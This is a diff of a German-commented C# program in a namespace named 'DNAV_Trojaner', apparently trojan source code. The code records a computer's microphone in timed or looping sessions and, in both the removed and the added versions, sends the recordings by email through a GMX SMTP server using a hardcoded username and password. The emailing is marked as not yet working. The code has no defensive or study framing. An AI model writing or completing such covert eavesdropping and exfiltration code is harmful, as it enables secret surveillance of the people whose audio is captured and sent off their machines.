@@ -2,74 +2,62 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
-using NAudio.Wave;
-using System.Net.Mail;
+using System.IO;
+
 namespace DNAV_Trojaner {
     class Program {
-        //! benötigt: https://github.com/naudio/NAudio/releases
-        static public WaveInEvent waveSource = null;
-        static public WaveFileWriter waveFile = null;
+        static public void tonaufnahme() {
+        //! Beispieleinbindungen 
+        //? Am besten trz eigene Console samt guten Name.  
+            //! ini   
+            Mailer m = new Mailer("dnav@gmx.com"); //? Selber Email senden
+            string log = @"log.txt";
+            File.Delete(log);
+            System.Threading.Thread.Sleep(100);
+            int sec = 10;
 
-        static public int time = 2;
-        static public string email = "temp@mail.de";
-        
-        static public string username = "DNAV@gmx.de";
-        static public string pw = "MiauMiau";
-        static public string message = "Audio von DNAV";
-        static public void waveSource_DataAvailable(object sender, WaveInEventArgs e) {
-            if (waveFile != null) {
-                waveFile.Write(e.Buffer, 0, e.BytesRecorded);
-                waveFile.Flush();
-            }
+        //! Einbindungsmöglichkeit 1
+            //? Selber Start-Stop
+            Audio aufnahme01 = new Audio(@"test01");
+            aufnahme01.start();
+            System.Threading.Thread.Sleep(sec * 1000);
+            aufnahme01.stop();
+
+        //! Einbindungsmöglichkeit 2
+            //? Start mit auto Stop
+            Audio aufnahme02 = new Audio(@"test02");
+            aufnahme02.start(sec);
+
+            //! Nur auf Ende warten..
+            System.Threading.Thread.Sleep(sec * 1000);
+
+        //! Einbindungsmöglichkeit 3
+            //? Start mit Loop und Funktion
+            Audio aufnahme03 = new Audio(@"test03");
+            Audio.Execution func = (path) => {
+                //? An dieser Stelle wäre speichern/senden 
+                //TODO: Funktioniert noch nicht: m.send("Neue Datei", "Eine neue Datei verfügbat:", path);
+                StreamWriter sw = new StreamWriter(log, true, Encoding.ASCII);
+                sw.Write(path+"\n");
+                sw.Close();
+            };
+            aufnahme03.start(sec, func);
+        //! Läuft nun bis Beendung.     
+            //! Abbruch Via 
+            aufnahme03.stop();
+            //! Nur in einem anderen Thread möglich
         }
 
-        static public void waveSource_RecordingStopped(object sender, StoppedEventArgs e) {
-            if (waveSource != null) {
-                waveSource.Dispose();
-                waveSource = null;
-            }
-
-            if (waveFile != null) {
-                waveFile.Dispose();
-
-                waveFile = null;
-            }
-        }
-
-        static public void send(){
-            MailMessage mail = new  MailMessage();
-            SmtpClient SmtpServer = new SmtpClient();
-            SmtpServer.UseDefaultCredentials = false;
-            SmtpServer.Credentials = new System.Net.NetworkCredential(username, pw);
-            SmtpServer.EnableSsl = false;
-            mail.To.Add(email);
-            mail.From = new MailAddress("dnav@gmx.com");
-            mail.Subject = "Soundoutput";
-            mail.Attachments.Add(new Attachment("Test.wav"));
-            mail.Body = message;
-            SmtpServer.Host = "mail.gmx.com";
-            SmtpServer.Port = 465;
-            SmtpServer.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
-            try {
-                //! FEHLER
-                SmtpServer.Send(mail);
-            }
-            catch (Exception ex) {
-                Console.WriteLine(ex);
-                Console.ReadLine();
-            }
+    //! Beispieleinbindungen
+        public void sendMail(){
+            Mailer A = new Mailer("tempTo@mail.de");
+            Mailer B = new Mailer("tempTo@mail.de","dnav@gmx.com","DNAV@gmx.de","MiauMiau",465,"mail.gmx.com");
+            A.send("Betreff/Neue Datei", "Inhalt/Eine neue Datei verfügbat:", @"path");
+            B.send("Betreff","Inhalt");
         }
         static void Main(string[] args) {
-            waveSource = new WaveInEvent();
-            waveSource.WaveFormat = new WaveFormat(44100, 1);
-            waveSource.DataAvailable += new EventHandler <WaveInEventArgs> (waveSource_DataAvailable);
-            waveSource.RecordingStopped += new EventHandler <StoppedEventArgs> (waveSource_RecordingStopped);
-            waveFile = new WaveFileWriter(@"Test.wav", waveSource.WaveFormat);
-            waveSource.StartRecording();
-            System.Threading.Thread.Sleep(time*1000);
-            waveSource.StopRecording(); 
-            send();
+            //TODO: Funktioniert noch nicht: sendMail();
+            tonaufnahme();
         }
     }
 }
